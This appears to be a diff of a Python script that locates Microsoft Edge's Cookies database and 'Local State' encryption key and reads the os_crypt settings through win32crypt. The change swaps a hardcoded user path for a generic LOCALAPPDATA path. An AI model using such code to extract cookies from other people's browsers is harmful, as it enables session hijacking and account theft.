@@ -10,9 +10,9 @@ import sqlite3
 
 import win32crypt
 
-UD = r'C:\Users\klklk\AppData\Local\Microsoft\Edge\User Data'
-DB = UD + r'\Default\Network\Cookies'
-LS = UD + r'\Local State'
+UD = __import__('os').path.join(__import__('os').environ.get('LOCALAPPDATA', ''), 'Microsoft', 'Edge', 'User Data')
+DB = __import__('os').path.join(UD, 'Default', 'Network', 'Cookies')
+LS = __import__('os').path.join(UD, 'Local State')
 
 state = json.load(open(LS, encoding='utf-8'))
 oc = state.get('os_crypt', {})
